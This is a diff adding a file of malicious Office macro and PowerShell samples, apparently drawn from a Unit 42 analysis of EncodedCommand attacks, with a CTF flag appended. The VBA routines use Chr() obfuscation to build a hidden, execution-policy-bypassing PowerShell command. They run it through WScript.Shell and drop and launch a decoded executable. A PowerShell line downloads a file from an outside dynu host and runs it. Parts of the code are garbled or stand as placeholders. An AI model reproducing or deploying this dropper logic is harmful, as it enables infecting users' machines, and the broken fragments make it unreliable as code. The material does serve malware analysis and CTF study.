@@ -1,0 +1,51 @@
+Source: https://unit42.paloaltonetworks.com/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/
+
+
+﻿
+Sub My4mGpqk()
+Dim x, c As String
+x = GetVal (32715, 32715, 170)
+base-64 encoded PowerShell
+c = "pow" & Chr(101) & Chr(114) & Chr(83) & Chr(104) & Chr(101) & Chr(76) & "1.exe -nop -noni " &
+"-win" & Chr(100) & Chr(111) & Chr(119) & Chr(115) & Chr(116) & Chr(121) & Chr(108) & Chr(101) & Chr(32) & Chr(104) & Chr(105) & Chr(100) & "den " & Chr(45) & Chr(101) & Chr(120) & Chr(101) & Chr(99) & Chr(32) & Chr(98) & Chr(121) & Chr(112) & Chr(97) & Chr(115) & Chr(115) & ""& "-" & "no" & x
+Set = CreateObject("WsCrip" & "t." & "Sh" & "ell")
+3. Run c, 0
+End Sub
+Sub MteLFEOH()
+Dim p, pth As String
+Dim b
+pth = Application.UserLibraryPath & rndname & Chr(46) & Chr(101) & Chr(120) & Chr(101)
+p = GetVal (8000, 8005, 202)
+b = dec (p)
+Call rit (pth, b)
+Shell (pth)
+base-64 encoded PE
+End Sub
+
+
+
+
+
+
+if ((Get-Date).Ticks -lt (Get-Date -Date '18-jan-2017 00:00:00').Ticks) {(New-Object System.Net.WebClient).DownloadFile('http://drobbox-api.dynu[.]com/update',"$env:temp\update");Start-Process pythonw.exe "$env:temp\update 31337"};#NIXU17{pow3r_t0_the_sh3lls}
+
+
+
+
+﻿
+Sub FHGstneH ()
+Dim x, c As String
+x = GetVal (4909, 4909, 176)
+c = "pow" & Chr(101) & Chr(114) & Chr(83) & Chr(104) & Chr(101) & Chr(76) & "1.exe -nop-noni "&
+"-win" & Chr(100) & Chr(111) & Chr(119) & Chr(115) & Chr(116) & Chr(121) & Chr(108) & Chr(101) & Chr(32) & Chr(104) & Chr(105) & Chr(100) & "den" & Chr(45) & Chr(101) & Chr(120) & Chr(101) & Chr(99) & Chr(32) & Chr(98) & Chr(121) & Chr(112) & Chr(97) & Chr(115) & Chr(115) & ""& "-" & "no" & x
+Set = CreateObject("WsCrip" & "t." & "Sh" & "ell")
+3. Run c, 0
+End Sub
+
+
+
+
+
+
+
+
